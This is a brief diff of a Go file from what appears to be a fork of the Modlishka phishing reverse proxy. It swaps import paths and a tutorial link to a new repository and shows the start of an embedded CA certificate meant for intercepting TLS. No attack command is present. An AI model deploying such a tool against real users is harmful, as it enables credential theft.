@@ -26,12 +26,12 @@ import (
 	"math/big"
 	"time"
 
-	"github.com/drk1wi/Modlishka/config"
-	"github.com/drk1wi/Modlishka/log"
+	"github.com/thechiragjogani/modlishka/config"
+	"github.com/thechiragjogani/modlishka/log"
 )
 
 // Paste your CA certificate and key in the following format
-// Ref: https://github.com/drk1wi/Modlishka/wiki/Quickstart-tutorial
+// Ref: https://github.com/thechiragjogani/modlishka/wiki/Quickstart-tutorial
 
 const CA_CERT = `-----BEGIN CERTIFICATE-----
 MIIDRDCCAiwCCQC/MUuFNX64sjANBgkqhkiG9w0BAQsFADBkMQswCQYDVQQGEwJw
